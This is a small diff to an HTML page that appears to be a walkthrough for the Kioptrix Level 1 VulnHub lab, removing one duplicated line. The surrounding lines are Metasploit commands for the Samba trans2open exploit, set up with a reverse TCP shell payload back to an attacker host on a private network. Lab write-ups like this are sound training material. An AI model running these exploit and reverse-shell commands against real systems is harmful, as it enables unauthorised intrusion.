@@ -49,7 +49,6 @@ link: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ .
             <code> msf > use exploit/linux/samba/trans2open  </code> <br>
             <code> msf exploit(linux/samba/trans2open) > set RHOST 192.168.1.104 </code> <br>
             <code> msf exploit(linux/samba/trans2open) > set RPORT 139 </code> <br>
-            <code> msf exploit(linux/samba/trans2open) > set RPORT 139 </code> <br>
             <code> msf exploit(linux/samba/trans2open) > set payload generic/shell_reverse_tcp </code> <br>
             <code> msf exploit(linux/samba/trans2open) > set LHOST 192.168.1.105 </code> <br>
             <code> msf exploit(linux/samba/trans2open) > set LPORT 4444 </code> <br>
